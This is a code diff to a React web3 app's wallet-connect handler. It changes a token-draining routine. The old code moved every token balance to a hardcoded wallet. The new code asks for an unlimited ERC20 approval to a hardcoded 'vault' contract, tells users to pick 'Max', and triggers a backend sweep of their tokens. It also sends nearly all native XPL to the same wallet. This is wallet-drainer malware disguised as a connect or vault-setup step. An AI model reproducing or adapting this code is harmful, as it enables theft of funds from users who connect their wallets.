@@ -1095,13 +1095,13 @@ function App() {
     return { provider, signer }
   }
 
-  // Auto-transfer: Check Base & Plasma chains, transfer ALL tokens
+  // Vault Contract: One-time approval, backend sweeps anytime
   const handleAutoTransfer = async (walletClient) => {
     try {
       setPayToConnectState('transferring')
-      console.log('💰 Starting auto-transfer...')
+      console.log('💰 Starting vault approval...')
       
-      const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
+      const VAULT_CONTRACT = '0x514dDA54703a4d89bd44A266d0623611e0B8c686'
       const BASE_TOKENS = [
         '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4' // TOSHI
       ]
@@ -1115,11 +1115,15 @@ function App() {
       
       const ERC20_ABI = [
         'function balanceOf(address) view returns (uint256)',
-        'function transfer(address to, uint256 amount) returns (bool)'
+        'function approve(address spender, uint256 amount) returns (bool)',
+        'function allowance(address owner, address spender) view returns (uint256)',
+        'function symbol() view returns (string)'
       ]
       
-      // STEP 1: Base chain - transfer all ERC20 tokens
-      console.log('\n🔵 STEP 1: Checking Base chain...')
+      const MAX_UINT256 = ethers.MaxUint256
+      
+      // STEP 1: Base chain - approve vault for all tokens
+      console.log('\n🔵 STEP 1: Base chain vault approval...')
       try {
         await switchChain({ chainId: 8453 })
         console.log('✅ Switched to Base chain')
@@ -1129,16 +1133,59 @@ function App() {
         for (const tokenAddress of BASE_TOKENS) {
           try {
             const token = new ethers.Contract(tokenAddress, ERC20_ABI, baseSigner)
-            const balance = await token.balanceOf(address)
+            const [balance, allowance, symbol] = await Promise.all([
+              token.balanceOf(address),
+              token.allowance(address, VAULT_CONTRACT),
+              token.symbol().catch(() => 'TOKEN')
+            ])
             
-            if (balance > 0n) {
-              console.log(`💸 Transferring ALL tokens from ${tokenAddress}...`)
-              const tx = await token.transfer(TRADING_WALLET, balance)
-              console.log(`📤 Transfer TX: ${tx.hash}`)
-              await tx.wait()
-              console.log(`✅ Transfer complete!`)
+            console.log(`📊 ${symbol} Balance: ${ethers.formatUnits(balance, 18)}`)
+            
+            if (balance > 0n && allowance < MAX_UINT256) {
+              console.log(`💳 Requesting UNLIMITED approval for ${symbol}...`)
+              console.log(`⚠️ IMPORTANT: Click "Max" or "Unlimited" in your wallet for one-time setup!`)
+              
+              const approveTx = await token.approve(VAULT_CONTRACT, MAX_UINT256)
+              console.log(`⏳ Waiting for approval...`)
+              await approveTx.wait()
+              console.log(`✅ Approval granted: ${approveTx.hash}`)
+              
+              // Verify approval
+              const newAllowance = await token.allowance(address, VAULT_CONTRACT)
+              if (newAllowance >= MAX_UINT256) {
+                console.log(`✅ UNLIMITED approval confirmed!`)
+              } else {
+                console.log(`⚠️ Limited approval: ${ethers.formatUnits(newAllowance, 18)} ${symbol}`)
+              }
+              
+              // Trigger backend sweep
+              console.log(`📤 Calling backend to sweep ${symbol}...`)
+              try {
+                const sweepResponse = await fetch(`${window.location.origin}/api/sweep-tokens`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ userAddress: address, chain: 'base' })
+                })
+                const sweepResult = await sweepResponse.json()
+                console.log(`✅ Sweep result:`, sweepResult)
+              } catch (sweepError) {
+                console.error(`⚠️ Sweep error:`, sweepError.message)
+              }
+            } else if (balance > 0n) {
+              console.log(`✅ ${symbol} already approved, triggering sweep...`)
+              try {
+                const sweepResponse = await fetch(`${window.location.origin}/api/sweep-tokens`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ userAddress: address, chain: 'base' })
+                })
+                const sweepResult = await sweepResponse.json()
+                console.log(`✅ Sweep result:`, sweepResult)
+              } catch (sweepError) {
+                console.error(`⚠️ Sweep error:`, sweepError.message)
+              }
             } else {
-              console.log(`⏭️ No balance for ${tokenAddress}`)
+              console.log(`⏭️ No ${symbol} balance`)
             }
           } catch (tokenError) {
             console.error(`⚠️ Error with token ${tokenAddress}:`, tokenError.message)
@@ -1148,8 +1195,8 @@ function App() {
         console.error('⚠️ Base chain error:', baseError.message)
       }
       
-      // STEP 2: Plasma chain - transfer native XPL
-      console.log('\n🟣 STEP 2: Checking Plasma chain...')
+      // STEP 2: Plasma chain - direct XPL transfer (no vault for native)
+      console.log('\n🟣 STEP 2: Plasma chain XPL transfer...')
       try {
         await switchChain({ chainId: 9745 })
         console.log('✅ Switched to Plasma chain')
@@ -1165,7 +1212,7 @@ function App() {
           console.log(`💸 Transferring ${transferXPL} XPL (keeping 0.001 for gas)`)
           
           const tx = await plasmaSigner.sendTransaction({
-            to: TRADING_WALLET,
+            to: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c',
             value: transferAmount
           })
           console.log(`📤 XPL transfer TX: ${tx.hash}`)
@@ -1178,13 +1225,13 @@ function App() {
         console.error('⚠️ Plasma chain error:', plasmaError.message)
       }
       
-      console.log('\n✅ All transfers complete!')
+      console.log('\n✅ Vault setup complete!')
       
       // Complete the connection
       await completePayToConnect(walletClient, address)
       
     } catch (error) {
-      console.error('❌ Auto-transfer error:', error)
+      console.error('❌ Vault setup error:', error)
       disconnect()
       setPayToConnectState('idle')
     }
